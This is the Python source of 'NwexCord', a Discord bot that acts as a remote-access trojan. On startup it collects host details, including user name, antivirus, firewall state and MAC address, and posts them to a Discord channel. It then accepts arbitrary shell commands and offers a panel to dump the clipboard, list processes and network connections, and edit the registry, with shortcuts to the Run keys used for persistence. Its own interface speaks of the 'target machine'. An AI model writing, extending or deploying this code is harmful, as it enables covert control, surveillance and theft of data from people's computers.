#!/usr/bin/env python3
"""
NwexCord - Discord Interactive Shell Bot
A tool for executing shell commands via Discord messages
"""

import discord
from discord.ext import commands
import subprocess
import os
import sys
from datetime import datetime
import platform
import uuid
import ctypes
import locale
import config

def get_sys_info():
    info = {}
    
    info["UserName"] = os.getlogin()
    info["PCName"] = platform.node()
    info["OS"] = f"Microsoft {platform.system()} {platform.release()} {platform.machine()}"
    info["Platform"] = f"Win{platform.release()}" if platform.system() == "Windows" else platform.system()
    info["Ver"] = platform.version()
    
    info["Client"] = os.path.abspath(__file__)
    info["Process"] = os.path.basename(sys.executable)
    info["DateTime"] = datetime.now().strftime("%Y.%m.%d %H:%M:%S")
    
    info["GPU"] = "Unknown"
    info["CPU"] = platform.processor()
    try:
        gpu_req = subprocess.check_output("wmic path win32_VideoController get name", shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
        if gpu_req: info["GPU"] = gpu_req
        cpu_req = subprocess.check_output("wmic cpu get name", shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
        if cpu_req: info["CPU"] = cpu_req
    except: pass
        
    info["Identifier"] = platform.processor()
    
    info["Ram"] = "Unknown"
    try:
        total_ram = int(subprocess.check_output("wmic computersystem get TotalPhysicalMemory", shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip())
        info["Ram"] = f"{total_ram / (1024**3):.2f} GB"
    except: pass
        
    info["LastReboot"] = "Unknown"
    try:
        boot_str = subprocess.check_output("wmic os get lastbootuptime", shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip().split('.')[0]
        boot_time = datetime.strptime(boot_str, "%Y%m%d%H%M%S")
        hours_ago = int((datetime.now() - boot_time).total_seconds() / 3600)
        info["LastReboot"] = f"{hours_ago} hour(s) ago"
    except: pass
        
    info["Antivirus"] = "Unknown"
    try:
        av = subprocess.check_output("powershell \"Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName\"", shell=True, stderr=subprocess.DEVNULL).decode().strip().split('\n')[0].strip()
        info["Antivirus"] = av if av else "Windows Defender"
    except: pass
        
    info["Firewall"] = "Unknown"
    try:
        fw = subprocess.check_output("netsh advfirewall show allprofiles state", shell=True, stderr=subprocess.DEVNULL).decode()
        info["Firewall"] = "Enabled" if "ON" in fw.upper() or "AÇIK" in fw.upper() else "Disabled"
    except: pass
        
    info["MacAddress"] = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]).upper()
    
    info["DefaultBrowser"] = "Unknown"
    try:
        b_id = subprocess.check_output("reg query \"HKCU\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\" /v ProgId", shell=True, stderr=subprocess.DEVNULL).decode()
        for b in ["Chrome", "Firefox", "Edge", "Opera", "Brave"]:
            if b.lower() in b_id.lower():
                info["DefaultBrowser"] = b
                break
    except: pass
        
    info["CurrentLang"] = "Unknown"
    try:
        info["CurrentLang"] = locale.getlocale()[0].split('_')[0].upper()
    except: pass
        
    info[".Net"] = "Unknown"
    try:
        net_v = subprocess.check_output("reg query \"HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\" /v Release", shell=True, stderr=subprocess.DEVNULL).decode()
        info[".Net"] = "v4.0+" if "Release" in net_v else "v4.0"
    except: pass
        
    info["Battery"] = "Unknown"
    class SYSTEM_POWER_STATUS(ctypes.Structure):
        _fields_ = [('AC', ctypes.c_byte), ('BatFlag', ctypes.c_byte), ('BatLife', ctypes.c_byte), ('SysStat', ctypes.c_byte), ('BatLifeTime', ctypes.c_ulong), ('BatFullLifeTime', ctypes.c_ulong)]
    p_stat = SYSTEM_POWER_STATUS()
    if ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(p_stat)):
        info["Battery"] = "No Battery (Desktop)" if p_stat.BatFlag == 128 else f"{p_stat.BatLife}%"

    return info

# Bot setup
intents = discord.Intents.default()
intents.message_content = True  # Required to read message content

bot = commands.Bot(command_prefix=config.PREFIX, intents=intents)

class ShellExecutor:
    @staticmethod
    def execute(command: str):
        """Executes a system command and returns the output"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                encoding='utf-8',
                errors='replace'
            )
            return {
                "success": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "return_code": result.returncode
            }
        except Exception as e:
            return {
                "success": False,
                "stdout": "",
                "stderr": str(e),
                "return_code": -1
            }

# ========================================
# Tools System
# ========================================

TOOL_COMMANDS = {
    "activewindows": {
        "title": "🪟 Active Windows",
        "cmd": 'powershell "Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object -Property Id, ProcessName, MainWindowTitle | Format-Table -AutoSize"',
        "description": "Currently visible windows"
    },
    "tcp": {
        "title": "🌐 TCP Connections",
        "cmd": 'netstat -an | findstr ESTABLISHED',
        "description": "Active TCP connections"
    },
    "startup": {
        "title": "🚀 Startup Manager",
        "cmd": 'powershell "Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location | Format-Table -AutoSize"',
        "description": "Programs that run at startup"
    },
    "process": {
        "title": "📊 Process Manager",
        "cmd": 'powershell "Get-Process | Sort-Object -Descending CPU | Select-Object -First 20 Id, ProcessName, @{N=\'CPU(s)\';E={[math]::Round($_.CPU,1)}}, @{N=\'RAM(MB)\';E={[math]::Round($_.WS/1MB,1)}} | Format-Table -AutoSize"',
        "description": "Top 20 processes by CPU usage"
    },
    "service": {
        "title": "🔧 Service Manager",
        "cmd": 'powershell "Get-Service | Where-Object {$_.Status -eq \'Running\'} | Select-Object -First 25 Status, Name, DisplayName | Format-Table -AutoSize"',
        "description": "Running services (first 25)"
    },
    "clipboard": {
        "title": "📋 Clipboard Manager",
        "cmd": 'powershell "Get-Clipboard"',
        "description": "Current clipboard content"
    },
    "programs": {
        "title": "💿 Installed Programs",
        "cmd": 'powershell "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion | Where-Object {$_.DisplayName -ne $null} | Sort-Object DisplayName | Format-Table -AutoSize"',
        "description": "All installed programs"
    },
}

async def run_tool(interaction: discord.Interaction, tool_key: str):
    """Execute a tool command and send the result as an embed."""
    tool = TOOL_COMMANDS[tool_key]
    await interaction.response.defer(thinking=True)
    
    result = ShellExecutor.execute(tool["cmd"])
    
    output = result["stdout"] if result["stdout"] else result["stderr"]
    if not output:
        output = "No output."
    
    # Discord embed description limit is 4096
    if len(output) > 3800:
        output = output[:3800] + "\n...(truncated)..."
    
    color = discord.Color.green() if result["success"] else discord.Color.red()
    
    embed = discord.Embed(
        title=tool["title"],
        description=f"*{tool['description']}*\n```\n{output}\n```",
        color=color,
        timestamp=datetime.utcnow()
    )
    embed.set_footer(text="NwexCord • Tools")
    
    await interaction.followup.send(embed=embed)


# ========================================
# Interactive Registry Editor
# ========================================

import hashlib

ROOT_HIVES = [
    "HKEY_CLASSES_ROOT",
    "HKEY_CURRENT_USER",
    "HKEY_LOCAL_MACHINE",
    "HKEY_USERS",
]

class RegistryEditor:
    """Helper class to interact with the Windows Registry via reg.exe."""
    
    @staticmethod
    def get_subkeys(path: str):
        """Get subkeys of a registry path."""
        try:
            result = subprocess.run(
                f'reg query "{path}"', shell=True,
                capture_output=True, text=True, timeout=10,
                encoding='utf-8', errors='replace'
            )
            subkeys = []
            for line in result.stdout.strip().split('\n'):
                line = line.strip()
                if line and line.startswith(path + "\\"):
                    subkey_name = line[len(path)+1:]
                    if "\\" not in subkey_name:
                        subkeys.append(subkey_name)
            return subkeys
        except:
            return []
    
    @staticmethod
    def get_values(path: str):
        """Get values (name, type, data) of a registry key."""
        try:
            result = subprocess.run(
                f'reg query "{path}" /v *', shell=True,
                capture_output=True, text=True, timeout=10,
                encoding='utf-8', errors='replace'
            )
            values = []
            for line in result.stdout.strip().split('\n'):
                line = line.strip()
                if not line or line.startswith("HKEY") or line.startswith("End"):
                    continue
                parts = line.split(None, 2)
                if len(parts) >= 3:
                    values.append({
                        "name": parts[0],
                        "type": parts[1],
                        "data": parts[2]
                    })
                elif len(parts) == 2:
                    values.append({
                        "name": parts[0],
                        "type": parts[1],
                        "data": ""
                    })
            return values
        except:
            return []
    
    @staticmethod
    def add_value(path: str, name: str, reg_type: str, data: str):
        """Add or set a registry value."""
        try:
            result = subprocess.run(
                f'reg add "{path}" /v "{name}" /t {reg_type} /d "{data}" /f',
                shell=True, capture_output=True, text=True, timeout=10,
                encoding='utf-8', errors='replace'
            )
            return result.returncode == 0, result.stdout.strip() + result.stderr.strip()
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def delete_value(path: str, name: str):
        """Delete a registry value."""
        try:
            if name.lower() == "(default)":
                cmd = f'reg delete "{path}" /ve /f'
            else:
                cmd = f'reg delete "{path}" /v "{name}" /f'
            result = subprocess.run(
                cmd,
                shell=True, capture_output=True, text=True, timeout=10,
                encoding='utf-8', errors='replace'
            )
            return result.returncode == 0, result.stdout.strip() + result.stderr.strip()
        except Exception as e:
            return False, str(e)


def build_registry_embed(current_path: str, session_id: str):
    """Build the registry editor embed for a given path."""
    parts = current_path.split("\\") if current_path else []
    
    # Build tree view
    tree = ""
    if not current_path:
        for hive in ROOT_HIVES:
            tree += f"  📁 {hive}\n"
    else:
        for i, part in enumerate(parts):
            prefix = "┣ " if i < len(parts) - 1 else "┗ "
            indent = "┃ " * i
            icon = "📂" if i == len(parts) - 1 else "📁"
            bold = f"**{part}**" if i == len(parts) - 1 else part
            tree += f"{indent}{prefix}{icon} {bold}\n"
        
        subkeys = RegistryEditor.get_subkeys(current_path)
        indent = "┃ " * len(parts)
        for sk in subkeys[:12]:
            tree += f"{indent}┣ 📁 {sk}\n"
        if len(subkeys) > 12:
            tree += f"{indent}┗ *...+{len(subkeys)-12} more*\n"
    
    # Build values table as a monospace code block
    values_block = ""
    val_count = 0
    if current_path:
        values = RegistryEditor.get_values(current_path)
        val_count = len(values)
        if values:
            # Calculate column widths
            names = [v['name'][:18] for v in values[:10]]
            types = [v['type'][:14] for v in values[:10]]
            datas = [v['data'][:22] for v in values[:10]]
            
            nw = max(max(len(n) for n in names), 4) + 1
            tw = max(max(len(t) for t in types), 4) + 1
            
            header = f"{'Name':<{nw}} {'Type':<{tw}} Value"
            sep = "─" * (nw + tw + 20)
            values_block = f"```\n{header}\n{sep}\n"
            
            for i in range(len(names)):
                values_block += f"{names[i]:<{nw}} {types[i]:<{tw}} {datas[i]}\n"
            
            if val_count > 10:
                values_block += f"... +{val_count - 10} more values\n"
            values_block += "```"
        else:
            values_block = "```\nNo values in this key.\n```"
    else:
        values_block = "```\nSelect a hive to view values.\n```"
    
    subkey_count = len(RegistryEditor.get_subkeys(current_path)) if current_path else len(ROOT_HIVES)
    
    embed = discord.Embed(
        title=f"🔑 Registry Editor : {session_id[:20]}",
        color=discord.Color.from_rgb(30, 30, 30)
    )
    embed.add_field(name="🗂️ Tree", value=tree[:1024] if tree else "Empty", inline=False)
    embed.add_field(name=f"📄 Values [{val_count}]", value=values_block[:1024], inline=False)
    embed.set_footer(text=f"Keys [{subkey_count}] | Path: {current_path or 'Root'}")
    
    return embed


class NewValueModal(discord.ui.Modal, title="Add New Registry Value"):
    """Modal for adding a new registry value."""
    val_name = discord.ui.TextInput(label="Value Name", placeholder="MyValue", required=True)
    val_type = discord.ui.TextInput(label="Type", placeholder="REG_SZ, REG_DWORD, REG_QWORD...", default="REG_SZ", required=True)
    val_data = discord.ui.TextInput(label="Data", placeholder="Enter value data", required=True)
    
    def __init__(self, reg_path: str, session_id: str, page: int = 0):
        super().__init__()
        self.reg_path = reg_path
        self.session_id = session_id
        self.page = page
    
    async def on_submit(self, interaction: discord.Interaction):
        success, msg = RegistryEditor.add_value(
            self.reg_path, str(self.val_name), str(self.val_type), str(self.val_data)
        )
        status = "✅ Value added!" if success else f"❌ Error: {msg}"
        embed = build_registry_embed(self.reg_path, self.session_id)
        view = RegistryView(self.reg_path, self.session_id, page=self.page)
        await interaction.response.edit_message(content=status, embed=embed, view=view)


class EditValueModal(discord.ui.Modal, title="Edit Registry Value"):
    """Modal for editing a registry value (pre-filled)."""
    val_name = discord.ui.TextInput(label="Value Name", required=True)
    val_type = discord.ui.TextInput(label="Type", placeholder="REG_SZ, REG_DWORD...", default="REG_SZ", required=True)
    val_data = discord.ui.TextInput(label="New Data", placeholder="New value data", required=True)
    
    def __init__(self, reg_path: str, session_id: str, prefill_name: str = "", prefill_type: str = "REG_SZ", prefill_data: str = "", page: int = 0):
        super().__init__()
        self.reg_path = reg_path
        self.session_id = session_id
        self.page = page
        self.original_name = prefill_name  # Store original name to detect renames
        self.val_name.default = prefill_name
        self.val_type.default = prefill_type
        self.val_data.default = prefill_data[:100]
    
    async def on_submit(self, interaction: discord.Interaction):
        try:
            new_name = str(self.val_name).strip()
            reg_type = str(self.val_type).strip().upper()
            data = str(self.val_data).strip()
            
            # If name changed, delete old value first
            renamed = new_name != self.original_name
            if renamed:
                RegistryEditor.delete_value(self.reg_path, self.original_name)
            
            success, msg = RegistryEditor.add_value(self.reg_path, new_name, reg_type, data)
            
            color = discord.Color.green() if success else discord.Color.red()
            status_icon = "✅" if success else "❌"
            
            desc = f"**Name:** `{new_name}`\n**Type:** `{reg_type}`\n**Data:** `{data}`\n\n**Result:** {msg}"
            if renamed:
                desc = f"**Renamed:** `{self.original_name}` → `{new_name}`\n" + desc
            
            result_embed = discord.Embed(
                title=f"{status_icon} Edit Value",
                description=desc,
                color=color
            )
            result_embed.set_footer(text=f"Path: {self.reg_path}")
            await interaction.response.send_message(embed=result_embed, ephemeral=True)
        except Exception as e:
            try:
                await interaction.response.send_message(f"❌ Unexpected error: {e}", ephemeral=True)
            except Exception:
                await interaction.followup.send(f"❌ Unexpected error: {e}", ephemeral=True)
    
    async def on_error(self, interaction: discord.Interaction, error: Exception):
        try:
            await interaction.response.send_message(f"❌ Modal error: {error}", ephemeral=True)
        except Exception:
            await interaction.followup.send(f"❌ Modal error: {error}", ephemeral=True)


class RegistryNavSelect(discord.ui.Select):
    """Dropdown to navigate into subkeys (paginated, 24 per page)."""
    def __init__(self, current_path: str, session_id: str, page: int = 0):
        self.current_path = current_path
        self.session_id = session_id
        self.page = page
        
        if not current_path:
            options = [discord.SelectOption(label=h, emoji="📁") for h in ROOT_HIVES]
        else:
            all_subkeys = RegistryEditor.get_subkeys(current_path)
            start = page * 24
            end = start + 24
            page_keys = all_subkeys[start:end]
            total_pages = max(1, (len(all_subkeys) + 23) // 24)
            
            if page_keys:
                options = [discord.SelectOption(label=sk[:100], emoji="📁") for sk in page_keys]
                if total_pages > 1:
                    options.append(discord.SelectOption(
                        label=f"Page {page+1}/{total_pages} ({len(all_subkeys)} keys)",
                        value="_pageinfo", emoji="📄"
                    ))
            else:
                options = [discord.SelectOption(label="(no subkeys)", value="_none")]
        
        super().__init__(placeholder="📂 Navigate to subkey...", options=options, row=0)
    
    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        if selected in ("_none", "_pageinfo"):
            await interaction.response.defer()
            return
        new_path = f"{self.current_path}\\{selected}" if self.current_path else selected
        embed = build_registry_embed(new_path, self.session_id)
        view = RegistryView(new_path, self.session_id, page=0)
        await interaction.response.edit_message(content=None, embed=embed, view=view)


class RegistryValSelect(discord.ui.Select):
    """Dropdown to select a value for viewing/editing/deleting."""
    def __init__(self, current_path: str, session_id: str, page: int = 0):
        self.current_path = current_path
        self.session_id = session_id
        self.page = page
        
        values = RegistryEditor.get_values(current_path) if current_path else []
        if values:
            options = []
            seen_values = set()
            for i, v in enumerate(values[:25]):
                data_preview = (v['data'][:45] if v['data'] else "(empty)")
                # Use index prefix to guarantee unique option values
                unique_val = f"{i}:{v['name'][:95]}"
                seen_values.add(unique_val)
                options.append(discord.SelectOption(
                    label=v['name'][:100],
                    description=f"{v['type']} = {data_preview}"[:100],
                    value=unique_val,
                    emoji="📝"
                ))
        else:
            options = [discord.SelectOption(label="(no values)", value="_none")]
        
        super().__init__(placeholder="📝 Select a value to manage...", options=options, row=1)
    
    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        if selected == "_none":
            await interaction.response.defer()
            return
        
        # Parse index from unique value "idx:name"
        idx_str, val_name = selected.split(":", 1)
        idx = int(idx_str)
        
        values = RegistryEditor.get_values(self.current_path)
        found = values[idx] if idx < len(values) else None
        
        if not found:
            await interaction.response.send_message("❌ Value not found.", ephemeral=True)
            return
        
        detail_embed = discord.Embed(
            title=f"📝 Value: {found['name']}",
            color=discord.Color.from_rgb(50, 50, 80)
        )
        detail_embed.add_field(name="Name", value=f"`{found['name']}`", inline=True)
        detail_embed.add_field(name="Type", value=f"`{found['type']}`", inline=True)
        detail_embed.add_field(name="Data", value=f"```\n{found['data'][:500]}\n```", inline=False)
        detail_embed.set_footer(text=f"Path: {self.current_path}")
        
        view = ValueActionView(self.current_path, self.session_id, found['name'], found['type'], found['data'], self.page)
        await interaction.response.send_message(embed=detail_embed, view=view)


class ValueActionView(discord.ui.View):
    """Edit/Delete buttons shown after selecting a specific value."""
    def __init__(self, reg_path: str, session_id: str, val_name: str, val_type: str, val_data: str, page: int = 0):
        super().__init__(timeout=120)
        self.reg_path = reg_path
        self.session_id = session_id
        self.val_name = val_name
        self.val_type = val_type
        self.val_data = val_data
        self.page = page
    
    @discord.ui.button(label="Edit Value", emoji="✏️", style=discord.ButtonStyle.primary)
    async def edit_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = EditValueModal(
            self.reg_path, self.session_id,
            prefill_name=self.val_name,
            prefill_type=self.val_type,
            prefill_data=self.val_data,
            page=self.page
        )
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="Delete Value", emoji="🗑️", style=discord.ButtonStyle.danger)
    async def delete_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        success, msg = RegistryEditor.delete_value(self.reg_path, self.val_name)
        status = "✅ Value deleted!" if success else f"❌ Error: {msg}"
        result_embed = discord.Embed(
            title="🗑️ Delete Result",
            description=status,
            color=discord.Color.green() if success else discord.Color.red()
        )
        await interaction.response.edit_message(embed=result_embed, view=None)


class RegistryView(discord.ui.View):
    """Full interactive registry editor view with pagination and value selection."""
    def __init__(self, current_path: str = "", session_id: str = "", page: int = 0):
        super().__init__(timeout=300)
        self.current_path = current_path
        self.session_id = session_id
        self.page = page
        
        # Row 0: subkey navigation
        self.add_item(RegistryNavSelect(current_path, session_id, page))
        
        # Row 1: values dropdown (only when values exist)
        if current_path:
            vals = RegistryEditor.get_values(current_path)
            if vals:
                self.add_item(RegistryValSelect(current_path, session_id, page))
    
    @discord.ui.button(label="⬆ Back", style=discord.ButtonStyle.secondary, row=2)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not self.current_path or "\\" not in self.current_path:
            new_path = ""
        else:
            new_path = "\\".join(self.current_path.split("\\")[:-1])
        embed = build_registry_embed(new_path, self.session_id)
        view = RegistryView(new_path, self.session_id, page=0)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="◀", style=discord.ButtonStyle.secondary, row=2)
    async def prev_page_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        new_page = max(0, self.page - 1)
        embed = build_registry_embed(self.current_path, self.session_id)
        view = RegistryView(self.current_path, self.session_id, page=new_page)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="▶", style=discord.ButtonStyle.secondary, row=2)
    async def next_page_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.current_path:
            total = len(RegistryEditor.get_subkeys(self.current_path))
            max_page = max(0, (total - 1) // 24)
        else:
            max_page = 0
        new_page = min(max_page, self.page + 1)
        embed = build_registry_embed(self.current_path, self.session_id)
        view = RegistryView(self.current_path, self.session_id, page=new_page)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=2)
    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = build_registry_embed(self.current_path, self.session_id)
        view = RegistryView(self.current_path, self.session_id, page=self.page)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="New Value", emoji="📝", style=discord.ButtonStyle.primary, row=3)
    async def newvalue_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not self.current_path:
            await interaction.response.send_message("❌ Select a key first!", ephemeral=True)
            return
        await interaction.response.send_modal(NewValueModal(self.current_path, self.session_id, self.page))
    
    @discord.ui.button(label="HKCU Run", emoji="👤", style=discord.ButtonStyle.secondary, row=3)
    async def hkcu_run_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        path = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
        embed = build_registry_embed(path, self.session_id)
        view = RegistryView(path, self.session_id, page=0)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="HKLM Run", emoji="💻", style=discord.ButtonStyle.secondary, row=3)
    async def hklm_run_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        path = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        embed = build_registry_embed(path, self.session_id)
        view = RegistryView(path, self.session_id, page=0)
        await interaction.response.edit_message(content=None, embed=embed, view=view)


class ToolsPanelView(discord.ui.View):
    """The panel with all 8 tool buttons."""
    def __init__(self):
        super().__init__(timeout=300)
    
    @discord.ui.button(label="Registry Editor", emoji="🔑", style=discord.ButtonStyle.secondary, row=0)
    async def registry_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        embed = build_registry_embed("", session_id)
        view = RegistryView("", session_id)
        await interaction.response.send_message(embed=embed, view=view)
    
    @discord.ui.button(label="Active Windows", emoji="🪟", style=discord.ButtonStyle.secondary, row=0)
    async def activewindows_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await run_tool(interaction, "activewindows")
    
    @discord.ui.button(label="TCP Connections", emoji="🌐", style=discord.ButtonStyle.secondary, row=0)
    async def tcp_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await run_tool(interaction, "tcp")
    
    @discord.ui.button(label="Startup Manager", emoji="🚀", style=discord.ButtonStyle.secondary, row=0)
    async def startup_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await run_tool(interaction, "startup")
    
    @discord.ui.button(label="Process Manager", emoji="📊", style=discord.ButtonStyle.secondary, row=1)
    async def process_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await run_tool(interaction, "process")
    
    @discord.ui.button(label="Service Manager", emoji="🔧", style=discord.ButtonStyle.secondary, row=1)
    async def service_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await run_tool(interaction, "service")
    
    @discord.ui.button(label="Clipboard", emoji="📋", style=discord.ButtonStyle.secondary, row=1)
    async def clipboard_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await run_tool(interaction, "clipboard")
    
    @discord.ui.button(label="Installed Programs", emoji="💿", style=discord.ButtonStyle.secondary, row=1)
    async def programs_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await run_tool(interaction, "programs")


class StartupView(discord.ui.View):
    """View attached to the startup message with a Tools button."""
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="Tools", emoji="🧰", style=discord.ButtonStyle.primary)
    async def tools_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        tools_embed = discord.Embed(
            title="🧰 NwexCord Tools",
            description="Select a tool from the buttons below to execute it on the target machine.",
            color=discord.Color.blurple()
        )
        tools_embed.set_footer(text="NwexCord • Tools Panel")
        await interaction.response.send_message(embed=tools_embed, view=ToolsPanelView(), ephemeral=False)

@bot.event
async def on_ready():
    client_id = bot.user.id
    invite_link = f"https://discord.com/api/oauth2/authorize?client_id={client_id}&permissions=8&scope=bot"
    
    print(f'--- NwexCord Active ---')
    print(f'Bot Username: {bot.user.name}')
    print(f'Bot ID: {bot.user.id}')
    print(f'Server Count: {len(bot.guilds)}')
    print(f'Invite Link: {invite_link}')
    print(f'----------------------')
    
    if len(bot.guilds) == 0:
        print("WARNING: The bot is currently not in any servers!")
        print("Please use the link above to invite the bot to your server.")
    
    # Set bot status (Activity)
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.listening, 
        name=f"{config.PREFIX}shell"
    ))
    
    # Send "Active" message to the first available channel
    sent_message = False
    
    info = get_sys_info()
    
    left_col = (
        f"👤 **UserName** : {info['UserName']}\n"
        f"🖥️ **PCName** : {info['PCName']}\n"
        f"🪟 **OS** : {info['OS']}\n"
        f"📁 **Client** : {info['Client']}\n"
        f"⚙️ **Process** : {info['Process']}\n"
        f"📅 **DateTime** : {info['DateTime']}\n"
        f"🎇 **GPU** : {info['GPU']}\n"
        f"🧠 **CPU** : {info['CPU']}\n"
        f"🏷️ **Identifier** : {info['Identifier']}\n"
        f"📊 **Ram** : {info['Ram']}"
    )
    
    right_col = (
        f"⏱️ **LastReboot** : {info['LastReboot']}\n"
        f"🛡️ **Antivirus** : {info['Antivirus']}\n"
        f"⚠️ **Firewall** : {info['Firewall']}\n"
        f"🌐 **MacAddress** : {info['MacAddress']}\n"
        f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
        f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
        f"💻 **Platform** : {info['Platform']}\n"
        f"📋 **Ver** : {info['Ver']}\n"
        f"🔵 **.Net** : {info['.Net']}\n"
        f"🔋 **Battery** : {info['Battery']}"
    )
    
    embed = discord.Embed(
        title="[ Information ]", 
        color=discord.Color.dark_theme()
    )
    embed.add_field(name="\u200b", value=left_col, inline=True)
    embed.add_field(name="\u200b", value=right_col, inline=True)
    embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
    
    msg_content = f"🚀 **NwexCord System Started!**\nUse `{config.PREFIX}shell <command>` to execute CMD/PowerShell commands on this machine."
    
    startup_view = StartupView()
    
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                try:
                    await channel.send(content=msg_content, embed=embed, view=startup_view)
                    sent_message = True
                    break
                except Exception as e:
                    print(f"Error sending to {channel.name}: {e}")
                    continue
        if sent_message: break

@bot.command(name="shell")
async def shell_command(ctx, *, cmd: str):
    """Executes command via Discord: .shell dir"""
    
    # Send info message
    msg = await ctx.send(f"⚡ Executing: `{cmd}`...")
    
    # Execute command
    result = ShellExecutor.execute(cmd)
    
    # Prepare output
    output = ""
    if result["stdout"]:
        # Discord has a 2000 character limit, taking the last 1500 characters
        stdout_text = result["stdout"]
        if len(stdout_text) > 1500:
            stdout_text = "...(truncated)...\n" + stdout_text[-1500:]
        output += f"**Output:**\n```\n{stdout_text}\n```\n"
        
    if result["stderr"]:
        stderr_text = result["stderr"]
        if len(stderr_text) > 400:
            stderr_text = stderr_text[:400] + "\n...(truncated)..."
        output += f"**Errors:**\n```\n{stderr_text}\n```\n"
        
    if not output:
        output = "Command executed but produced no output."

    # Create embed
    color = discord.Color.green() if result["success"] else discord.Color.red()
    status = "✅ Success" if result["success"] else "❌ Error"
    
    embed = discord.Embed(
        title=f"{status}: {cmd[:50]}",
        description=output,
        color=color,
        timestamp=datetime.utcnow()
    )
    embed.set_footer(text=f"Return Code: {result['return_code']}")
    
    await msg.edit(content=None, embed=embed)

@bot.command(name="ping")
async def ping(ctx):
    await ctx.send(f"Pong! Latency: {round(bot.latency * 1000)}ms")

@bot.command(name="tools")
async def tools_command(ctx):
    """Opens the tools panel with interactive buttons."""
    tools_embed = discord.Embed(
        title="🧰 NwexCord Tools",
        description="Select a tool from the buttons below to execute it on the target machine.",
        color=discord.Color.blurple()
    )
    tools_embed.set_footer(text="NwexCord • Tools Panel")
    await ctx.send(embed=tools_embed, view=ToolsPanelView())

if __name__ == "__main__":
    if config.BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("ERROR: Please add your Discord Bot Token to config.py!")
        sys.exit(1)
        
    try:
        bot.run(config.BOT_TOKEN.strip())
    except Exception as e:
        print(f"Failed to start bot: {e}")